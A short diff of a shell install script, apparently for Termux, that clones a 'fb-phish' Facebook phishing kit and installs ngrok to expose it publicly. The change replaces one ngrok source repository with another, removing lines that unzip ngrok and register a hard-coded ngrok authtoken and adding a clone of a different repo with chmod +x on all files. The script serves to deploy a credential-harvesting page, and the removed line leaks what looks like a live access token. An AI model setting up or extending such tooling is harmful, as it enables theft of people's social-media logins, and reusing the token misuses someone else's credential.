@@ -17,13 +17,9 @@ git clone https://github.com/Tutorial-Mania/fb-phish
 sleep 1
 cd
 sleep 1
-git clone https://github.com/Darkmux/NgrokTH
-cd NgrokTH
-cp ngrok-stable-linux-arm.zip $HOME
-cd $HOME
-unzip ngrok-stable-linux-arm.zip
-rm -rf ngrok-stable-linux-arm.zip
-./ngrok authtoken 1pzIKYeGaWvKh0LeIYGvFbYqrJo_5XJxRspjkd9NemhPfu6kw
+git clone https://github.com/HarrisSec/best-ngrok
+cd best-ngrok
+chmod +x *
 sleep 1
 cp ngrok /data/data/com.termux/files/home/fb-phish
 sleep 2
